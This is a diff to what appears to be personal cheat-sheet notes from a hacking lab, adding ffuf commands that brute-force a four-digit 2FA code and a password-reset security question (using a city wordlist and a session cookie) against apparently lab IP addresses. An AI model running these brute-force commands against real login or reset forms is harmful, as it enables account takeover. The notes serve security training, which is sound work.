@@ -33,3 +33,10 @@ ffuf -w /usr/share/seclists/Fuzzing/6-digits-000000-999999.txt -u http://http://
 ```bash
 ffuf -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt -u http://94.237.50.176:35539/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=39fap95ns90q60bq5r570nnskf" -d "otp=FUZZ" -fr "Invalid 2FA Code"
 ```
+
+# Vulnerable Password Reset
+
+
+```bash
+ffuf -w ./city_wordlist.txt -u http://83.136.254.37:41526/security_question.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=avengbtka78s63jkgpf2i5g3il" -d "security_response=FUZZ" -fr "Incorrect response."
+```
